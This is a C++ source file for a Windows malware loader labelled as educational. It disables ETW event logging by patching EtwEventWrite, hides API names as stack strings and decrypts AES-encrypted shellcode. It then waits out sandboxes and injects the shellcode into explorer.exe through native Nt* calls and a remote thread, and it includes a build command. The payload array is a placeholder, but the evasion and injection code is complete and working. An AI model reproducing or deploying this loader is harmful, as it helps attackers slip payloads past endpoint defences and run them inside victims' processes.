/*
 * Final Loader — Combines multiple evasion techniques
 * FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
 *
 * Techniques used:
 *   - ETW patching
 *   - String obfuscation (stack strings)
 *   - Dynamic API resolution via GetProcAddress
 *   - AES-256 encrypted shellcode (via BCrypt)
 *   - Nt* API calls for memory operations
 *   - Remote process injection
 *   - W^X memory permissions (RW -> RX)
 */

#include <windows.h>
#include <bcrypt.h>
#include <tlhelp32.h>

#pragma comment(lib, "bcrypt.lib")
// working compiler command: x86_64-w64-mingw32-g++     -O2 -s -fno-exceptions -fno-rtti     -ffunction-sections -fdata-sections -Wl,--gc-sections     -static -mwindows     -o loader.exe loader.cpp     -lbcrypt -lws2_320
// ============================================================
// SECTION 1: AES-256 Encrypted Shellcode (from aes_encrypt.py)
// ============================================================

unsigned char aes_key[] = {
    0x60, 0x72, 0xa3, 0x14, 0xb5, 0xc6, 0xd7, 0xe8,
    0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60,
    0x71, 0x82, 0x93, 0xa4, 0xb5, 0xc6, 0xd7, 0xe8,
    0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60
};

unsigned char aes_iv[] = {
    0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x07, 0x18,
    0x29, 0x3a, 0x4b, 0x5c, 0x6d, 0x7e, 0x8f, 0x90
};

unsigned char encrypted_shellcode[] = {
    // Paste AES-encrypted shellcode from Python script
    0x00  // placeholder
};

//unsigned char encrypted_shellcode[] = { ${SHELLCODE} };
//unsigned char key[]       = { ${KEY} };
//unsigned char iv[]        = { ${IV} };
SIZE_T original_shellcode_size = 460;  // Update from Python output

// ============================================================
// SECTION 2: Stack Strings (no strings in .rdata)
// ============================================================

void BuildString_ntdll(char* out) {
    out[0]='n'; out[1]='t'; out[2]='d'; out[3]='l';
    out[4]='l'; out[5]='.'; out[6]='d'; out[7]='l';
    out[8]='l'; out[9]='\0';
}

void BuildString_kernel32(char* out) {
    out[0]='k'; out[1]='e'; out[2]='r'; out[3]='n';
    out[4]='e'; out[5]='l'; out[6]='3'; out[7]='2';
    out[8]='.'; out[9]='d'; out[10]='l'; out[11]='l';
    out[12]='\0';
}

void BuildString_EtwEventWrite(char* out) {
    out[0]='E'; out[1]='t'; out[2]='w'; out[3]='E';
    out[4]='v'; out[5]='e'; out[6]='n'; out[7]='t';
    out[8]='W'; out[9]='r'; out[10]='i'; out[11]='t';
    out[12]='e'; out[13]='\0';
}

// ============================================================
// SECTION 3: ETW Patching
// ============================================================

void PatchETW() {
    char ntdll[10]; BuildString_ntdll(ntdll);
    char etwFunc[14]; BuildString_EtwEventWrite(etwFunc);

    HMODULE hNtdll = GetModuleHandleA(ntdll);
    if (!hNtdll) return;

    FARPROC pETW = GetProcAddress(hNtdll, etwFunc);
    if (!pETW) return;

    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax,rax; ret
    DWORD oldProtect;
    VirtualProtect((LPVOID)pETW, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    for (int i = 0; i < sizeof(patch); i++)
        ((unsigned char*)pETW)[i] = patch[i];
    VirtualProtect((LPVOID)pETW, sizeof(patch), oldProtect, &oldProtect);
}

// ============================================================
// SECTION 4: AES Decryption (BCrypt API)
// ============================================================

BOOL AESDecrypt(unsigned char* ct, SIZE_T ct_len,
                unsigned char* key, SIZE_T key_len,
                unsigned char* iv, SIZE_T iv_len,
                unsigned char** pt, SIZE_T* pt_len) {

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbResult = 0, cbKeyObj = 0;
    PBYTE pbKeyObj = NULL;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return FALSE; }

    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObj, sizeof(DWORD), &cbResult, 0);
    pbKeyObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj,
        key, (ULONG)key_len, 0);
    if (!BCRYPT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pbKeyObj);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Copy IV (BCryptDecrypt modifies it)
    unsigned char* ivCopy = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, iv_len);
    for (SIZE_T i = 0; i < iv_len; i++) ivCopy[i] = iv[i];

    // Get output size
    DWORD cbPt = 0;
    BCryptDecrypt(hKey, ct, (ULONG)ct_len, NULL, ivCopy, (ULONG)iv_len,
        NULL, 0, &cbPt, BCRYPT_BLOCK_PADDING);

    *pt = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, cbPt);

    // Reset IV copy
    for (SIZE_T i = 0; i < iv_len; i++) ivCopy[i] = iv[i];

    // Decrypt
    status = BCryptDecrypt(hKey, ct, (ULONG)ct_len, NULL,
        ivCopy, (ULONG)iv_len, *pt, cbPt, &cbPt, BCRYPT_BLOCK_PADDING);

    *pt_len = cbPt;

    HeapFree(GetProcessHeap(), 0, ivCopy);
    HeapFree(GetProcessHeap(), 0, pbKeyObj);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return BCRYPT_SUCCESS(status);
}

// ============================================================
// SECTION 5: Process Discovery
// ============================================================

DWORD FindTargetProcess() {
    // Build target name on stack
    char target[16];
    target[0]='e'; target[1]='x'; target[2]='p'; target[3]='l';
    target[4]='o'; target[5]='r'; target[6]='e'; target[7]='r';
    target[8]='.'; target[9]='e'; target[10]='x'; target[11]='e';
    target[12]='\0';

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, target) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

// ============================================================
// SECTION 6: Dynamic API Resolution
// ============================================================

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID,
    PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtOpenProcess)(
    PHANDLE, ACCESS_MASK, PVOID, PVOID);

typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } MY_CID;
typedef struct {
    ULONG Length; HANDLE RootDirectory; PVOID ObjectName;
    ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQoS;
} MY_OA;

// ============================================================
// SECTION 7: Main Entry Point
// ============================================================

int main() {
    // ---- Phase 1: Pre-flight ----
    // Add anti-sandbox delay
    Sleep(3000 + (GetTickCount() % 2000));

    // Patch ETW (stop event logging)
    PatchETW();

    // ---- Phase 2: Resolve APIs ----
    char ntdll[10]; BuildString_ntdll(ntdll);
    HMODULE hNtdll = GetModuleHandleA(ntdll);
    if (!hNtdll) return 1;

    // Build function names on stack
    char sNtAlloc[26]; // NtAllocateVirtualMemory
    sNtAlloc[0]='N'; sNtAlloc[1]='t'; sNtAlloc[2]='A'; sNtAlloc[3]='l';
    sNtAlloc[4]='l'; sNtAlloc[5]='o'; sNtAlloc[6]='c'; sNtAlloc[7]='a';
    sNtAlloc[8]='t'; sNtAlloc[9]='e'; sNtAlloc[10]='V'; sNtAlloc[11]='i';
    sNtAlloc[12]='r'; sNtAlloc[13]='t'; sNtAlloc[14]='u'; sNtAlloc[15]='a';
    sNtAlloc[16]='l'; sNtAlloc[17]='M'; sNtAlloc[18]='e'; sNtAlloc[19]='m';
    sNtAlloc[20]='o'; sNtAlloc[21]='r'; sNtAlloc[22]='y'; sNtAlloc[23]='\0';

    char sNtWrite[23]; // NtWriteVirtualMemory
    sNtWrite[0]='N'; sNtWrite[1]='t'; sNtWrite[2]='W'; sNtWrite[3]='r';
    sNtWrite[4]='i'; sNtWrite[5]='t'; sNtWrite[6]='e'; sNtWrite[7]='V';
    sNtWrite[8]='i'; sNtWrite[9]='r'; sNtWrite[10]='t'; sNtWrite[11]='u';
    sNtWrite[12]='a'; sNtWrite[13]='l'; sNtWrite[14]='M'; sNtWrite[15]='e';
    sNtWrite[16]='m'; sNtWrite[17]='o'; sNtWrite[18]='r'; sNtWrite[19]='y';
    sNtWrite[20]='\0';

    char sNtProtect[25]; // NtProtectVirtualMemory
    sNtProtect[0]='N'; sNtProtect[1]='t'; sNtProtect[2]='P'; sNtProtect[3]='r';
    sNtProtect[4]='o'; sNtProtect[5]='t'; sNtProtect[6]='e'; sNtProtect[7]='c';
    sNtProtect[8]='t'; sNtProtect[9]='V'; sNtProtect[10]='i'; sNtProtect[11]='r';
    sNtProtect[12]='t'; sNtProtect[13]='u'; sNtProtect[14]='a'; sNtProtect[15]='l';
    sNtProtect[16]='M'; sNtProtect[17]='e'; sNtProtect[18]='m'; sNtProtect[19]='o';
    sNtProtect[20]='r'; sNtProtect[21]='y'; sNtProtect[22]='\0';

    char sNtThread[17]; // NtCreateThreadEx
    sNtThread[0]='N'; sNtThread[1]='t'; sNtThread[2]='C'; sNtThread[3]='r';
    sNtThread[4]='e'; sNtThread[5]='a'; sNtThread[6]='t'; sNtThread[7]='e';
    sNtThread[8]='T'; sNtThread[9]='h'; sNtThread[10]='r'; sNtThread[11]='e';
    sNtThread[12]='a'; sNtThread[13]='d'; sNtThread[14]='E'; sNtThread[15]='x';
    sNtThread[16]='\0';

    char sNtOpen[14]; // NtOpenProcess
    sNtOpen[0]='N'; sNtOpen[1]='t'; sNtOpen[2]='O'; sNtOpen[3]='p';
    sNtOpen[4]='e'; sNtOpen[5]='n'; sNtOpen[6]='P'; sNtOpen[7]='r';
    sNtOpen[8]='o'; sNtOpen[9]='c'; sNtOpen[10]='e'; sNtOpen[11]='s';
    sNtOpen[12]='s'; sNtOpen[13]='\0';

    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)
        GetProcAddress(hNtdll, sNtAlloc);
    pNtWriteVirtualMemory NtWrite = (pNtWriteVirtualMemory)
        GetProcAddress(hNtdll, sNtWrite);
    pNtProtectVirtualMemory NtProtect = (pNtProtectVirtualMemory)
        GetProcAddress(hNtdll, sNtProtect);
    pNtCreateThreadEx NtThread = (pNtCreateThreadEx)
        GetProcAddress(hNtdll, sNtThread);
    pNtOpenProcess NtOpen = (pNtOpenProcess)
        GetProcAddress(hNtdll, sNtOpen);

    if (!NtAlloc || !NtWrite || !NtProtect || !NtThread || !NtOpen) return 1;

    // ---- Phase 3: Decrypt shellcode ----
    unsigned char* decrypted = NULL;
    SIZE_T decrypted_len = 0;

    if (!AESDecrypt(encrypted_shellcode, sizeof(encrypted_shellcode),
                    aes_key, sizeof(aes_key),
                    aes_iv, sizeof(aes_iv),
                    &decrypted, &decrypted_len)) {
        return 1;
    }

    // ---- Phase 4: Find and open target process ----
    DWORD targetPID = FindTargetProcess();
    if (!targetPID) {
        SecureZeroMemory(decrypted, decrypted_len);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return 1;
    }

    HANDLE hProcess = NULL;
    MY_OA oa = { sizeof(MY_OA), 0 };
    MY_CID cid = { (HANDLE)(ULONG_PTR)targetPID, 0 };

    NtOpen(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!hProcess) {
        SecureZeroMemory(decrypted, decrypted_len);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return 1;
    }

    // ---- Phase 5: Inject via Nt APIs ----

    // Allocate RW memory in target
    PVOID remoteBase = NULL;
    SIZE_T regionSize = original_shellcode_size + 4096; // Extra padding
    NtAlloc(hProcess, &remoteBase, 0, &regionSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteBase) {
        SecureZeroMemory(decrypted, decrypted_len);
        HeapFree(GetProcessHeap(), 0, decrypted);
        CloseHandle(hProcess);
        return 1;
    }

    // Write decrypted shellcode to remote process
    SIZE_T written = 0;
    NtWrite(hProcess, remoteBase, decrypted,
            original_shellcode_size, &written);

    // Immediately zero local decrypted copy
    SecureZeroMemory(decrypted, decrypted_len);
    HeapFree(GetProcessHeap(), 0, decrypted);

    // Change remote memory to RX (W^X compliance)
    PVOID protBase = remoteBase;
    SIZE_T protSize = original_shellcode_size;
    ULONG oldProt = 0;
    NtProtect(hProcess, &protBase, &protSize,
              PAGE_EXECUTE_READ, &oldProt);

    // Create remote thread via NtCreateThreadEx
    HANDLE hThread = NULL;
    NtThread(&hThread, THREAD_ALL_ACCESS, NULL,
             hProcess, remoteBase, NULL,
             0, 0, 0, 0, NULL);

    // Wait briefly then exit (or wait for thread)
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
    return 0;
}

